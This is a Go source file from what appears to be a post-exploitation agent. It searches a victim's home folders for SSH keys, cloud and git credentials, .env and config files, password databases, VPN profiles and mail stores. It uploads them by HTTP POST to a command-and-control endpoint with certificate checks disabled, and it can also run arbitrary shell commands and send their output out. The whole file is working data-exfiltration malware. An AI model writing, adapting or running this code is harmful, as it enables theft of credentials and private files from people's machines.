// agents/cell/post/exfil.go
// Data exfiltration — HTTP POST, DNS tunnel, file collection.

package post

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type ExfilResult struct {
	Success    bool
	Method     string
	FilesSent  int
	TotalBytes int64
	Error      string
}

type ExfilConfig struct {
	C2Endpoint string // http://c2:8443/upload
	Method     string // http, dns
	MaxSize    int64  // max file size in bytes
}

var exfilHTTPClient = &http.Client{
	Timeout: 30 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

// CollectAndExfil finds interesting files and exfiltrates them.
func CollectAndExfil(cfg ExfilConfig) ExfilResult {
	if cfg.MaxSize <= 0 {
		cfg.MaxSize = 10 * 1024 * 1024 // 10MB default
	}
	if cfg.C2Endpoint == "" {
		cfg.C2Endpoint = "http://127.0.0.1:8443/upload"
	}

	files := findInterestingFiles(cfg.MaxSize)
	if len(files) == 0 {
		return ExfilResult{Error: "no interesting files found"}
	}

	r := ExfilResult{Method: cfg.Method, FilesSent: 0}
	for _, f := range files {
		data, err := os.ReadFile(f)
		if err != nil || int64(len(data)) > cfg.MaxSize {
			continue
		}
		if cfg.Method == "http" {
			if err := exfilHTTP(f, data, cfg.C2Endpoint); err != nil {
				r.Error = err.Error()
				continue
			}
		}
		r.FilesSent++
		r.TotalBytes += int64(len(data))
	}
	r.Success = r.FilesSent > 0
	return r
}

func exfilHTTP(filename string, data []byte, endpoint string) error {
	req, err := http.NewRequest("POST", endpoint, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("X-Filename", filepath.Base(filename))
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := exfilHTTPClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return nil
}

// findInterestingFiles searches common locations for valuable files.
func findInterestingFiles(maxSize int64) []string {
	var files []string
	home := os.Getenv("HOME")
	if home == "" {
		home = os.Getenv("USERPROFILE")
	}

	searchDirs := []string{
		home + "/Desktop", home + "/Documents", home + "/Downloads",
		home + "/Pictures", "/tmp", home + "\\Desktop", home + "\\Documents",
	}

	interestingExts := map[string]bool{
		".doc": true, ".docx": true, ".xls": true, ".xlsx": true,
		".pdf": true, ".pst": true, ".ost": true, ".kdbx": true,
		".rdp": true, ".ovpn": true, ".conf": true, ".config": true,
		".key": true, ".pem": true, ".ppk": true, ".p12": true,
		".txt": true, ".log": true, ".sql": true, ".dump": true,
	}

	interestingNames := map[string]bool{
		"id_rsa": true, "id_ed25519": true, "authorized_keys": true,
		"known_hosts": true, ".git-credentials": true, ".env": true,
		"config.php": true, "wp-config.php": true, "settings.py": true,
		"application.properties": true, "web.config": true,
		"credentials": true, "secrets": true, "passwords": true,
		"flag.txt": true, "root.txt": true, "user.txt": true,
	}

	for _, dir := range searchDirs {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			if info.Size() > maxSize || info.Size() < 10 {
				return nil
			}

			name := strings.ToLower(info.Name())
			ext := strings.ToLower(filepath.Ext(name))

			if interestingExts[ext] || interestingNames[name] {
				files = append(files, path)
			}
			return nil
		})
	}

	return files
}

// ExfilSingle exfiltrates a specific file.
func ExfilSingle(path string, endpoint string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	return exfilHTTP(path, data, endpoint)
}

// ExfilCommandOutput executes a command and exfiltrates its output.
func ExfilCommandOutput(cmd string, endpoint string) error {
	out, err := executeShellCommand(cmd)
	if err != nil {
		return err
	}
	req, err := http.NewRequest("POST", endpoint, strings.NewReader(out))
	if err != nil {
		return err
	}
	req.Header.Set("X-Cmd", cmd)
	resp, err := exfilHTTPClient.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func executeShellCommand(cmd string) (string, error) {
	var c *exec.Cmd
	if os.Getenv("OS") == "Windows_NT" || os.Getenv("USERPROFILE") != "" {
		c = exec.Command("cmd.exe", "/c", cmd)
	} else {
		c = exec.Command("/bin/sh", "-c", cmd)
	}
	out, err := c.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("command failed: %v", err)
	}
	return string(out), nil
}
